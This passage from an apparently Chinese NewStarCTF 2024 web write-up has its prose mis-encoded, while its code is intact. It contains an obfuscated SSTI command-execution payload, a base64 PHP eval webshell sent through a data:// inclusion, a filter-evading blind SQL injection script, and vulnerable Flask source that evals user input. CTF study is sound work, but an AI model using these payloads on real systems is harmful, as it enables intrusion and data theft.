</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] å“åº”å·²ä¿å­˜åˆ° response.html&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] è¯·æ±‚å¤±è´¥: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[-] å‘ç”Ÿé”™è¯¯: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># é…ç½®ç›®æ ‡ç½‘å€ (ç¤ºä¾‹: http://127.0.0.1:5000 æˆ– http://ctf.example.com)</span>
</span></span><span class="line"><span class="cl">    <span class="n">TARGET_URL</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.183.1:57968/&#34;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ç›®æ ‡ç½‘å€: </span><span class="si">{</span><span class="n">TARGET_URL</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;=&#34;</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fetch_and_submit</span><span class="p">(</span><span class="n">TARGET_URL</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250704133122136.png"
	width="1298"
	height="1114"
	srcset="/p/newstarctf2024/image-20250704133122136_hu11879576827635481643.png 480w, /p/newstarctf2024/image-20250704133122136_hu12695921654255813178.png 1024w"
	loading="lazy"
	
		alt="image-20250704133122136"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="279px"
	
></p>
<p>â€‹	æœ¬ç€å­¦ä¹ çš„ç›®çš„ï¼Œæˆ‘ä»¬è‡ªå·±ä¹Ÿæ‰‹æ“ä¸€ä¸ªå‡ºæ¥ï¼Œå¹¶è®°å½•å¤§è‡´æ€è·¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">bs4</span> <span class="n">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span><span class="c1">#åˆ›å»ºæŒä¹…ä¼šè¯å¯¹è±¡</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.183.1:57968/start&#39;</span> <span class="c1">#ç›´æ¥çœ‹startè·¯ç”±</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="c1">#è·å–å“åº”</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>     <span class="c1">#åˆ¤æ–­å“åº”çŠ¶æ€ç </span>
</span></span><span class="line"><span class="cl">    <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span> <span class="c1">#è§£æå“åº”</span>
</span></span><span class="line"><span class="cl">    <span class="n">text_element</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;p&#39;</span><span class="p">,</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;text&#39;</span><span class="p">)</span> <span class="c1">#æŸ¥æ‰¾idä¸ºtextçš„pæ ‡ç­¾</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">text_element</span><span class="p">:</span>                         <span class="c1">#åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">text_element</span><span class="o">.</span><span class="n">get_text</span><span class="p">()</span>      <span class="c1">#è·å–æ ‡ç­¾å†…å®¹</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{value}&#34;</span><span class="p">)</span>                    <span class="c1">#æ‰“å°</span>
</span></span><span class="line"><span class="cl">        <span class="n">submit_url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.183.1:57968/submit&#34;</span> <span class="c1">#æäº¤url</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;user_input&#39;</span><span class="p">:</span> <span class="n">value</span><span class="p">}</span>                  <span class="c1">#æäº¤æ•°æ®</span>
</span></span><span class="line"><span class="cl">        <span class="n">post_response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">submit_url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">post_response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>                        <span class="c1">#æ‰“å°å“åº”</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;{response.status_code}&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è„šæœ¬å¤šè¯•å‡ æ¬¡å°±è¡Œ</p>
<p><img src="/p/newstarctf2024/image-20250704140402437.png"
	width="1256"
	height="1105"
	srcset="/p/newstarctf2024/image-20250704140402437_hu6456156117190855277.png 480w, /p/newstarctf2024/image-20250704140402437_hu3448876863323710440.png 1024w"
	loading="lazy"
	
		alt="image-20250704140402437"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="272px"
	
></p>
<p>ä¸»è¦æ˜¯è¿ç”¨äº†<code>BeautifulSoup</code>æ¥å¤„ç†æ–‡æœ¬ï¼Œä»¥åå¯ä»¥å€Ÿé‰´è¿™ä¸ªæ¥å†™è„šæœ¬é¢˜ã€‚</p>
<h3 id="å¤è¯»æœº">å¤è¯»æœº
</h3><h4 id="çŸ¥è¯†ç‚¹ssti">çŸ¥è¯†ç‚¹ï¼šssti
</h4><p>sstiä¸å¤šè¯´æ­¦å™¨åº“ç›´æ¥ç‚¸äº†</p>
<p><img src="/p/newstarctf2024/image-20250704140615669.png"
	width="1080"
	height="543"
	srcset="/p/newstarctf2024/image-20250704140615669_hu11488853880225495200.png 480w, /p/newstarctf2024/image-20250704140615669_hu3682255479595245623.png 1024w"
	loading="lazy"
	
		alt="image-20250704140615669"
	
	
		class="gallery-image" 
		data-flex-grow="198"
		data-flex-basis="477px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u006f\u0073&#34;)|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;ls /&#34;)|attr(&#34;\u0072\u0065\u0061\u0064&#34;)()}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;)|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;\u006f\u0073&#34;)|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;cat /flag&#34;)|attr(&#34;\u0072\u0065\u0061\u0064&#34;)()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250704140842057.png"
	width="1096"
	height="497"
	srcset="/p/newstarctf2024/image-20250704140842057_hu7212022242857556096.png 480w, /p/newstarctf2024/image-20250704140842057_hu6254286435791532486.png 1024w"
	loading="lazy"
	
		alt="image-20250704140842057"
	
	
		class="gallery-image" 
		data-flex-grow="220"
		data-flex-basis="529px"
	
></p>
<h3 id="è°¢è°¢çš®è›‹-plus">è°¢è°¢çš®è›‹ plus
</h3><h4 id="çŸ¥è¯†ç‚¹sqlç»•è¿‡ç©ºæ ¼å’Œand">çŸ¥è¯†ç‚¹ï¼šsqlç»•è¿‡ç©ºæ ¼å’Œand
</h4><p>ç¯å¢ƒå¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œå°±æ˜¯ç”¨<code>/**/</code>ç»•è¿‡ç©ºæ ¼ï¼Œ<code>&amp;&amp;</code>ç»•è¿‡andï¼Œç›´æ¥è·³äº†</p>
<h3 id="é—å¤±çš„æ‹‰é“¾">é—å¤±çš„æ‹‰é“¾
</h3><h4 id="çŸ¥è¯†ç‚¹wwwzipæ³„éœ²phpmd5ç»•è¿‡">çŸ¥è¯†ç‚¹ï¼šwww.zipæ³„éœ²ã€phpmd5ç»•è¿‡
</h4><p>dirsearchæ‰«å‡ºwww.zip</p>
<p><img src="/p/newstarctf2024/image-20250704141759850.png"
	width="807"
	height="484"
	srcset="/p/newstarctf2024/image-20250704141759850_hu4951846303497329822.png 480w, /p/newstarctf2024/image-20250704141759850_hu11749666878323718574.png 1024w"
	loading="lazy"
	
		alt="image-20250704141759850"
	
	
		class="gallery-image" 
		data-flex-grow="166"
		data-flex-basis="400px"
	
></p>
<p>æ‰“å¼€åå‘ç°<code>pizwww.php</code></p>
<p><img src="/p/newstarctf2024/image-20250704141943300.png"
	width="1677"
	height="585"
	srcset="/p/newstarctf2024/image-20250704141943300_hu5742364147377571871.png 480w, /p/newstarctf2024/image-20250704141943300_hu202885759769741701.png 1024w"
	loading="lazy"
	
		alt="image-20250704141943300"
	
	
		class="gallery-image" 
		data-flex-grow="286"
		data-flex-basis="688px"
	
></p>
<p>å®¡è®¡ä»£ç ï¼Œä»£ç å¾ˆç®€å•ï¼Œç»•è¿‡å“ˆå¸Œçš„è¯ç›´æ¥ä¼ ä¸¤ä¸ªæ•°ç»„å°±è¡Œï¼Œå› ä¸ºshaå’Œmd5éƒ½ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œè¿”å›çš„ä¸œè¥¿éƒ½ä¸€æ ·ã€‚</p>
<p><img src="/p/newstarctf2024/image-20250704142729569.png"
	width="762"
	height="889"
	srcset="/p/newstarctf2024/image-20250704142729569_hu9869690893104118202.png 480w, /p/newstarctf2024/image-20250704142729569_hu4363859703173824047.png 1024w"
	loading="lazy"
	
		alt="image-20250704142729569"
	
	
		class="gallery-image" 
		data-flex-grow="85"
		data-flex-basis="205px"
	
></p>
<p>å…¶ä»–ç»•è¿‡å¯ä»¥çœ‹æˆ‘ä»¥å‰å†™çš„åšå®¢<a class="link" href="https://blog.csdn.net/Takagiapa/article/details/143588093?spm=1001.2014.3001.5501"  target="_blank" rel="noopener"
    >2024_BaseCTF_webmisc_week1_wp_basectfmisc-CSDNåšå®¢</a></p>
<h2 id="week3">Week3
</h2><h3 id="include-me">Include Me
</h3><h4 id="çŸ¥è¯†ç‚¹æ–‡ä»¶åŒ…å«dataä¼ªåè®®ä¼ æ–‡ä»¶">çŸ¥è¯†ç‚¹ï¼šæ–‡ä»¶åŒ…å«dataä¼ªåè®®ä¼ æ–‡ä»¶
</h4><p><img src="/p/newstarctf2024/image-20250704144740432.png"
	width="1016"
	height="485"
	srcset="/p/newstarctf2024/image-20250704144740432_hu17517169128495085531.png 480w, /p/newstarctf2024/image-20250704144740432_hu10144137370467036573.png 1024w"
	loading="lazy"
	
		alt="image-20250704144740432"
	
	
		class="gallery-image" 
		data-flex-grow="209"
		data-flex-basis="502px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">me=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pPz4&amp;iknow=1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pPz4æ˜¯&lt;?php @eval($_POST[&#39;a&#39;])?&gt;çš„base64ç¼–ç ï¼Œæˆ‘å»æ‰äº†ç­‰äºå·æ˜¯å› ä¸º=å·ä¼šè¢«waf
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250704151756266.png"
	width="1314"
	height="924"
	srcset="/p/newstarctf2024/image-20250704151756266_hu7304457968743615976.png 480w, /p/newstarctf2024/image-20250704151756266_hu3791547384576331214.png 1024w"
	loading="lazy"
	
		alt="image-20250704151756266"
	
	
		class="gallery-image" 
		data-flex-grow="142"
		data-flex-basis="341px"
	
></p>
<h3 id="blindsql1">blindsql1
</h3><h4 id="çŸ¥è¯†ç‚¹å¸ƒå°”ç›²æ³¨è„šæœ¬">çŸ¥è¯†ç‚¹ï¼šå¸ƒå°”ç›²æ³¨è„šæœ¬
</h4><p>fuzzä¸€ä¸‹ï¼Œbançš„ä¸œè¥¿è¿˜æŒºå¤š</p>
<p><img src="/p/newstarctf2024/image-20250704153254763.png"
	width="779"
	height="249"
	srcset="/p/newstarctf2024/image-20250704153254763_hu3962579438626819884.png 480w, /p/newstarctf2024/image-20250704153254763_hu16221271304767773355.png 1024w"
	loading="lazy"
	
		alt="image-20250704153254763"
	
	
		class="gallery-image" 
		data-flex-grow="312"
		data-flex-basis="750px"
	
></p>
<p>banäº†<code>union</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è”åˆæ³¨å…¥äº†ï¼Œå¦å¤–banäº†<code>ç©ºæ ¼å’Œ/</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨<code>/**/</code>ï¼Œç”¨<code>%09</code>ç»•è¿‡ç©ºæ ¼ã€‚ç”¨likeç»•è¿‡<code>=</code></p>
<p>substrå’Œasciiä¹Ÿè¿‡æ»¤äº†ï¼Œç”¨midä»£æ›¿ã€‚</p>
<p>å…·ä½“ä»£ç å¦‚ä¸‹ï¼Œç›´æ¥ç”¨äº†åˆ«äººçš„</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">import</span><span class="w"> </span><span class="n">requests</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">base_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;http://192.168.183.1:63261&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">while</span><span class="w"> </span><span class="no">True</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">32</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">127</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">tail</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">mid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">tail</span><span class="p">)</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="mi">2</span><span class="w">  </span><span class="c1"># ä½¿ç”¨æ•´æ•°é™¤æ³•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1"># æ ¹æ®éœ€è¦åˆ‡æ¢payload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="c1">#payload = &#34;sElect%09group_concat(table_name)%09FRom%09infOrmation_schema.tables%09Where%09table_schema%09like%09database()&#34;#courses,secrets,students
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="c1">#payload = &#34;sElect%09group_concat(column_name)%09FRom%09infOrmation_schema.columns%09Where%09table_name%09like%09&#39;secrets&#39;&#34;#id,secret_key,secret_value
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&#34;sElect%09group_concat(id,secret_key,secret_value)%09from%09`secrets`&#34;</span><span class="w">       </span><span class="c1">#è¿™é‡Œhere_is_flagè¦ç”¨åå¼•å·æ‰è¡Œï¼Œå•å¼•å·ä¸è¡Œï¼Œåå¼•å·ç”¨äºæ ‡è¯†æ•°æ®åº“ã€è¡¨ã€åˆ—ç­‰å¯¹è±¡çš„åç§°ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1"># æ„é€ æ­£ç¡®çš„URLå­—ç¬¦ä¸²ï¼ˆæ³¨æ„å»æ‰äº†æœ«å°¾é€—å·ï¼‰
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">        </span><span class="n">current_url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">f</span><span class="s2">&#34;{base_url}?student_name=Alice&#39;%09and%09Ord(mid(({payload}),{i},1))&gt;{mid}%23&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">current_url</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="s1">&#39;Alice&#39;</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="kt">text</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mid</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">else</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mid</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">head</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">32</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">result</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nf">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nf">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] å½“å‰ç»“æœ: {result}&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">else</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nf">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[+] å½“å‰ç»“æœ: {result}&#34;</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/newstarctf2024/image-20250704175002085.png"
	width="1230"
	height="83"
	srcset="/p/newstarctf2024/image-20250704175002085_hu2547967184718240022.png 480w, /p/newstarctf2024/image-20250704175002085_hu16872319139549224800.png 1024w"
	loading="lazy"
	
		alt="image-20250704175002085"
	
	
		class="gallery-image" 
		data-flex-grow="1481"
		data-flex-basis="3556px"
	
></p>
<h3 id="è‡­çš®çš„è®¡ç®—æœº">è‡­çš®çš„è®¡ç®—æœº
</h3><h4 id="çŸ¥è¯†ç‚¹æ— å­—æ¯rce">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯rce
</h4><p>è¿›/calcè·¯ç”±ï¼Œåœ¨æºä»£ç é‡Œçœ‹åˆ°pythonæºç ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask, render_template, request
</span></span><span class="line"><span class="cl">import uuid
</span></span><span class="line"><span class="cl">import subprocess
</span></span><span class="line"><span class="cl">import os
</span></span><span class="line"><span class="cl">import tempfile
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">app = Flask(__name__)
</span></span><span class="line"><span class="cl">app.secret_key = str(uuid.uuid4())
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">def waf(s):
</span></span><span class="line"><span class="cl">    token = True
</span></span><span class="line"><span class="cl">    for i in s:
</span></span><span class="line"><span class="cl">        if i in &#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;:
</span></span><span class="line"><span class="cl">            token = False
</span></span><span class="line"><span class="cl">            break
</span></span><span class="line"><span class="cl">    return token
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@app.route(&#34;/&#34;)
</span></span><span class="line"><span class="cl">def index():
</span></span><span class="line"><span class="cl">    return render_template(&#34;index.html&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">@app.route(&#34;/calc&#34;, methods=[&#39;POST&#39;, &#39;GET&#39;])
</span></span><span class="line"><span class="cl">def calc():
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    if request.method == &#39;POST&#39;:
</span></span><span class="line"><span class="cl">        num = request.form.get(&#34;num&#34;)
</span></span><span class="line"><span class="cl">        script = f&#39;&#39;&#39;import os
</span></span><span class="line"><span class="cl">print(eval(&#34;{num}&#34;))
</span></span><span class="line"><span class="cl">&#39;&#39;&#39;
</span></span><span class="line"><span class="cl">        print(script)
</span></span><span class="line"><span class="cl">        if waf(num):
</span></span><span class="line"><span class="cl">            try:
</span></span><span class="line"><span class="cl">                result_output = &#39;&#39;
</span></span><span class="line"><span class="cl">                with tempfile.NamedTemporaryFile(mode=&#39;w+&#39;, suffix=&#39;.py&#39;, delete=False) as temp_script:
</span></span><span class="line"><span class="cl">                    temp_script.write(script)
</span></span><span class="line"><span class="cl">                    temp_script_path = temp_script.name
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                result = subprocess.run([&#39;python3&#39;, temp_script_path], capture_output=True, text=True)
</span></span><span class="line"><span class="cl">                os.remove(temp_script_path)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                result_output = result.stdout if result.returncode == 0 else result.stderr
</span></span><span class="line"><span class="cl">            except Exception as e:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                result_output = str(e)
</span></span><span class="line"><span class="cl">            return render_template(&#34;calc.html&#34;, result=result_output)
</span></span><span class="line"><span class="cl">        else:
</span></span><span class="line"><span class="cl">            return render_template(&#34;calc.html&#34;, result=&#34;è‡­çš®ï¼ä½ æƒ³å¹²ä»€ä¹ˆï¼ï¼&#34;)
</span></span><span class="line"><span class="cl">    return render_template(&#34;calc.html&#34;, result=&#39;è¯•è¯•å‘—&#39;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">if __name__ == &#34;__main__&#34;:
</span></span><span class="line"><span class="cl">    app.run(host=&#39;0.0.0.0&#39;, port=30002)
</span></span><span class="line"><span class="cl"> --&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>æŠŠå­—æ¯banäº†ï¼Œå¯ä»¥ç”¨å…«è¿›åˆ¶asciiç ç»•è¿‡</p>
